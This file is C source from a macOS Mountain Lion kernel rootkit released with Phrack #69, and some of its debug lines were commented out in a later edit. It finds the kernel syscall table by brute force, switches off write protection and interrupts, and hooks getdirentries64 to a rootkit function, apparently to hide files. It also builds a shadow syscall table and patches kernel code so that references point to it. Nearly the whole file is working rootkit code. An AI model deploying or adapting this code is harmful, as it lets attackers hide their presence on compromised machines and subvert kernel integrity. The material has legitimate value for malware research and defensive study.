/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * sysent.c
 *
 * Functions to deal with sysent hijacking
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "sysent.h"

#include <mach-o/loader.h>
#include <libkern/libkern.h>
#include <mach/kern_return.h>
#include <sys/types.h>
#include <mach/mach_vm.h>
#include <string.h>
#include <mach-o/nlist.h>
#include <sys/malloc.h>

#include "cpu_protections.h"
#include "idt.h"
#include "hide_files.h"
#include "kernel_info.h"
#include "distorm.h"
#include "mnemonics.h"
#include "disasm_utils.h"
#include "utlist.h"
#include "configuration.h"

typedef int32_t	sy_call_t(struct proc *, void *, int *);
typedef void	sy_munge_t(const void *, void *);

// found in bsd/sys/sysent.h
struct sysent {                 /* system call table */
	int16_t		sy_narg;        /* number of args */
	int8_t		sy_resv;        /* reserved  */
	int8_t		sy_flags;       /* flags */
	sy_call_t	*sy_call;       /* implementing function */
	sy_munge_t	*sy_arg_munge32; /* system call arguments munger for 32-bit process */
	sy_munge_t	*sy_arg_munge64; /* system call arguments munger for 64-bit process */
	int32_t		sy_return_type; /* system call return types */
	uint16_t	sy_arg_bytes;	/* Total size of arguments in bytes for
								 * 32-bit system calls
								 */
};

struct sysent *g_sysent;
extern struct kernel_info g_kernel_info;

// reserve space to store the original function pointers
getdirentries64_func_t *real_getdirentries64 = NULL;

static void* bruteforce_sysent(void);
static mach_vm_address_t find_got_sysentptr(mach_vm_address_t l_sysent);
static mach_vm_address_t find_kernel_base(const mach_vm_address_t int80_address);
static mach_vm_address_t calculate_int80address(const mach_vm_address_t idt_address);
static kern_return_t find_data_segment(const mach_vm_address_t target_address, uint64_t *data_address, uint64_t *data_size);

#pragma mark Exported functions to hijack sysent, via table or syscall handler

/*
 * classic hijack of sysent table and pointers modification to our functions
 */
kern_return_t
hijack_sysent_table(void)
{
#if DEBUG
    //moony_modify//printf("[DEBUG] Finding sysent table...\n");
#endif
    // retrieve sysent address by bruteforce!
    g_sysent = (struct sysent*)bruteforce_sysent();
    if (g_sysent == NULL) 
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Error: Cannot find sysent table\n");
#endif
        return KERN_FAILURE;
    }
#if DEBUG
    //moony_modify//printf("[DEBUG] Found sysent at address %p\n", (void*)g_sysent);
#endif
    // Mountain Lion moved sysent[] to read-only section :-)
    // Disable the CR0 bit protection and do our job
    disable_wp();
    disable_interrupts();
    // save address for the real functions
    real_getdirentries64 = (getdirentries64_func_t*)g_sysent[SYS_getdirentries64].sy_call;
#if DEBUG
    //moony_modify//printf("[DEBUG] Starting sysent hijack ...\n");
#endif
    // replace the original functions with ours, aka hijacking!
    g_sysent[SYS_getdirentries64].sy_call = (sy_call_t*)rk_getdirentries64;
    
#if DEBUG
    //moony_modify//printf("[DEBUG] Sysent hijack is successful! Have fun...\n");
#endif
    // restore write protection
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

/*
 * remove the classic hijacking by restoring original function pointers
 */
kern_return_t
unhijack_sysent_table(void)
{
#if DEBUG
    //moony_modify//printf("[DEBUG] Starting sysent restore ...\n");
#endif
    disable_interrupts();
    disable_wp();
    if (real_getdirentries64 != NULL) g_sysent[SYS_getdirentries64].sy_call = (sy_call_t*)real_getdirentries64;
#if DEBUG
    //moony_modify//printf("[DEBUG] Original sysent restored!\n");
#endif
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}


/*
 * instead of hijacking the function pointers inside the table we redirect to our modified copy
 * by hijacking all the pointers that reference sysent
 * this way we can have a shadow copy and leave the original one modified
 */
struct xrefs *g_sysent_refs = NULL; // hold the sysent refs so we can unhijack if necessary
struct nops *g_sysent_nops = NULL;

kern_return_t
hijack_sysent_ptr(void)
{
    // retrieve sysent table address so we can lookup in __got section
    struct sysent *l_sysent = (struct sysent*)bruteforce_sysent();
    // find the sysent table symbol in __got section
    // functions that reference sysent table get the pointer from here so we want to find this address
    mach_vm_address_t sysent_ptr = find_got_sysentptr((mach_vm_address_t)l_sysent);
    // disassemble the kernel and find cross references to the __got address
    find_sysent_xrefs(sysent_ptr, &g_sysent_refs);
    // make a copy of sysent - shadow sysent
    // XXX: 500 is an arbitrary number - current number of implemented syscalls is 400 something in Mountain Lion
    size_t shadow_sysent_size = 500 * sizeof(struct sysent);
    struct sysent *shadow_sysent = _MALLOC(shadow_sysent_size, M_TEMP, M_ZERO);
    if (shadow_sysent == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Failed to allocate shadow sysent array!\n");
#endif
        return KERN_FAILURE;
    }
    memcpy(shadow_sysent, l_sysent, shadow_sysent_size);
#if DEBUG
    //moony_modify//printf("[DEBUG] %p new sysent location %p\n", (void*)shadow_sysent->sy_call, (void*)shadow_sysent);
#endif
    // find a free nop space where we can put the pointer to the shadow sysent
    if (find_nop_space(sizeof(mach_vm_address_t), 1, &g_sysent_nops) < 1) return KERN_FAILURE;
    struct nops *nops_cur = g_sysent_nops; // we just asked for 1 address so no need to lookup list
    
    disable_wp();
    disable_interrupts();
    // copy the new sysent table address into the sysent pointer we are going to use
    mach_vm_address_t kernel_ptr = nops_cur->address;
    *(uint64_t*)kernel_ptr = (mach_vm_address_t)shadow_sysent;
    
    // and now we need to modify all the references to sysent to point to the new pointer
    struct xrefs *cur;
    LL_FOREACH(g_sysent_refs, cur)
    {
        // calculate the RIP offset
        int32_t offset = (int32_t)(kernel_ptr - cur->address - cur->size);
        mach_vm_address_t address_to_patch = 0;
        // XXX: usually the CALLs are 7 bytes wide so offset is last 4 bytes
        //      this needs to be more robust and detect instructions type
        if (cur->size == 7) address_to_patch = cur->address + 3;
        // modify offset to the new pointer
        if (address_to_patch != 0) *(int32_t*)address_to_patch = offset;
    }
    // hook some syscalls in the shadow copy
#if DEBUG
    //moony_modify//printf("[DEBUG] Starting sysent ptr hijack ...\n");
#endif
    // replace the original functions with ours, aka hijacking!
    // we don't need to worry about restoring the original pointers because when we
    // unhijack we get rid of the shadow copy
    // this is not true if we want to temporarly enable and disable these hooks
    real_getdirentries64 = (getdirentries64_func_t*)shadow_sysent[SYS_getdirentries64].sy_call;
    shadow_sysent[SYS_getdirentries64].sy_call = (sy_call_t*)rk_getdirentries64;
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

/*
 * to unhijack the sysent call handler we just need to iterate the table and recalculate the offsets to the original sysent
 * since it wasn't modified we can get the symbol via __got section
 */
kern_return_t
unhijack_sysent_ptr(void)
{
    // retrieve sysent table address so we can lookup in __got section
    struct sysent *l_sysent = (struct sysent*)bruteforce_sysent();
    mach_vm_address_t sysent_ptr = find_got_sysentptr((mach_vm_address_t)l_sysent);
    disable_wp();
    disable_interrupts();    
    // and now we need to modify all the references to sysent to point to the new pointer
    struct xrefs *cur;
    LL_FOREACH(g_sysent_refs, cur)
    {
        int32_t offset = (int32_t)(sysent_ptr - cur->address - cur->size);
        mach_vm_address_t address_to_patch = 0;
        if (cur->size == 7) address_to_patch = cur->address + 3;        
        if (address_to_patch != 0) *(int32_t*)address_to_patch = offset;
    }
    // cleanup nop
    // XXX: we should have saved the original NOP and restore it
    //      but this should be correct in most cases since it's the usual instruction for 8 bytes NOP
    static const char alt_8[] =  {0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00};
    memcpy((void*)g_sysent_nops->address, alt_8, sizeof(alt_8));
    struct nops *tmp_nop = NULL;
    // XXX: fix mem leak and also the original NOP
    LL_DELETE(g_sysent_nops, tmp_nop);
    _FREE(tmp_nop, M_TEMP);
    g_sysent_nops = NULL;
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

#pragma mark Auxiliary functions

static mach_vm_address_t
find_got_sysentptr(mach_vm_address_t l_sysent)
{
    // find info about __got section
    struct mach_header_64 *mach_kernel = g_kernel_info.mh;
    struct load_command *load_cmd = NULL;
    uint64_t got_size = 0;
    mach_vm_address_t got_address = 0;
        
    // first we need to find where __got section is located in running kernel
    char *load_cmd_addr = (char*)mach_kernel + sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < mach_kernel->ncmds; i++)
    {
        load_cmd = (struct load_command*)load_cmd_addr;
        if (load_cmd->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd;
            if (strncmp(seg_cmd->segname, "__DATA", 16) == 0)
            {
                char *section_addr = load_cmd_addr + sizeof(struct segment_command_64);
                struct section_64 *sect_cmd = NULL;
                for (uint32_t x = 0; x < seg_cmd->nsects; x++)
                {
                    sect_cmd = (struct section_64*)section_addr;
                    if (strncmp(sect_cmd->sectname, "__got", 16) == 0)
                    {
                        got_address = sect_cmd->addr;
                        got_size    = sect_cmd->size;
                        break;
                    }
                    section_addr += sizeof(struct section_64);
                }
            }
        }
        load_cmd_addr += load_cmd->cmdsize;
    }    
    
    // now we can iterate over __got section and find the sysent pointer
    mach_vm_address_t sysent_got_ptr = 0;
    for (mach_vm_address_t z = got_address; z < (got_address + got_size); z += 8) // pointers are 8 bytes long
    {
        if (*(uint64_t*)z == (mach_vm_address_t)l_sysent)
        {
#if DEBUG
            //moony_modify//printf("[DEBUG] Found __got sysent ptr at %p\n", (void*)z);
#endif
            sysent_got_ptr = z;
        }
    }
    return sysent_got_ptr;
}

/*
 * brute force search sysent
 * this method works in all versions
 * returns a pointer to the sysent structure
 * Note: 32/64 bits compatible
 */
static void *
bruteforce_sysent(void)
{
    // retrieves the address of the IDT
    mach_vm_address_t idt_address = 0;
    get_addr_idt(&idt_address);
#if DEBUG
    //moony_modify//printf("[DEBUG] IDT Address is %p\n", (void*)idt_address);
#endif
    // calculate the address of the int80 handler
    mach_vm_address_t int80_address = calculate_int80address(idt_address);

    // search backwards for the kernel base address (mach-o header)
    mach_vm_address_t kernel_base = find_kernel_base(int80_address);
    if (kernel_base == 0) return NULL;

    uint64_t data_address = 0;
    uint64_t data_size = 0;
    // search for the __DATA segment
    find_data_segment(kernel_base, &data_address, &data_size);
    if (data_address == 0 || data_size == 0) return NULL;
    uint64_t data_limit = data_address + data_size;

    // bruteforce search for sysent in __DATA segment
    while (data_address <= data_limit)
    {
        struct sysent *table = (struct sysent*)(data_address);
        if(table[SYS_exit].sy_narg      == 1 &&
           table[SYS_fork].sy_narg      == 0 &&
           table[SYS_read].sy_narg      == 3 &&
           table[SYS_wait4].sy_narg     == 4 &&
           table[SYS_ptrace].sy_narg    == 4 &&
           table[SYS_getxattr].sy_narg  == 6 &&
           table[SYS_listxattr].sy_narg == 4 &&
           table[SYS_recvmsg].sy_narg   == 3 )
        {
#if DEBUG
            //moony_modify//printf("[DEBUG] exit() address is %p\n", (void*)table[SYS_exit].sy_call);
#endif
            return(table);
        }
        data_address++;
    }
    return NULL;
}

/*
 * calculate the address of the kernel int80 handler
 * using the IDT array
 */
static mach_vm_address_t
calculate_int80address(const mach_vm_address_t idt_address)
{
  	// find the address of interrupt 0x80 - EXCEP64_SPC_USR(0x80,hi64_unix_scall) @ osfmk/i386/idt64.s
	struct descriptor_idt *int80_descriptor;
	mach_vm_address_t int80_address;
    
    // we need to compute the address, it's not direct
    // extract the stub address
    // retrieve the descriptor for interrupt 0x80
    // the IDT is an array of descriptors
    int80_descriptor = (struct descriptor_idt*)(idt_address+sizeof(struct descriptor_idt)*0x80);
    uint64_t high = (unsigned long)int80_descriptor->offset_high << 32;
    uint32_t middle = (unsigned int)int80_descriptor->offset_middle << 16;
    int80_address = (mach_vm_address_t)(high + middle + int80_descriptor->offset_low); 
#if DEBUG
	//moony_modify//printf("[DEBUG] Address of interrupt 80 stub is %p\n", (void*)int80_address);
#endif
    return int80_address;
}

/*
 * find the kernel base address (mach-o header)
 * by searching backwards using the int80 handler as starting point
 */
static mach_vm_address_t
find_kernel_base(const mach_vm_address_t int80_address)
{
    mach_vm_address_t temp_address = int80_address;
    
    struct segment_command_64 *segment_command = NULL;
    while (temp_address > 0)
    {
        if (*(uint32_t*)(temp_address) == MH_MAGIC_64)
        {
            // make sure it's the header and not some reference to the MAGIC number
            segment_command = (struct segment_command_64*)(temp_address+sizeof(struct mach_header_64));
            if (strncmp(segment_command->segname, "__TEXT", 16) == 0)
            {
#if DEBUG
                //moony_modify//printf("[DEBUG] Found kernel mach-o header address at %p\n", (void*)(temp_address));
#endif
                return temp_address;
            }
        }
        if (temp_address - 1 > temp_address) break;
        temp_address--;
    }
    return 0;
}

/*
 * process target kernel module header and retrieve some info we need
 * more specifically the __DATA segment
 */
static kern_return_t
find_data_segment(const mach_vm_address_t target_address, uint64_t *data_address, uint64_t *data_size)
{
    // verify if it's a valid mach-o binary
    struct mach_header_64 *mh = (struct mach_header_64*)target_address;
    
    if (mh->magic != MH_MAGIC_64) return KERN_FAILURE;

    // first load cmd address
    char *load_cmd_addr = (char*)(target_address + sizeof(struct mach_header_64));

    // find the last command offset
    struct load_command *loadCommand = NULL;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        loadCommand = (struct load_command*)load_cmd_addr;
        if (loadCommand->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *segmentCommand = (struct segment_command_64 *)loadCommand;
            if (strncmp(segmentCommand->segname, "__DATA", 16) == 0)
            {
                *data_address = segmentCommand->vmaddr;
                *data_size    = segmentCommand->vmsize;
#if DEBUG
                //moony_modify//printf("[DEBUG] Found __DATA segment at %p!\n", (void*)(*data_address));
#endif
                break;
            }
        }
        // advance to next command
        load_cmd_addr += loadCommand->cmdsize;
    }
    return KERN_SUCCESS;
}

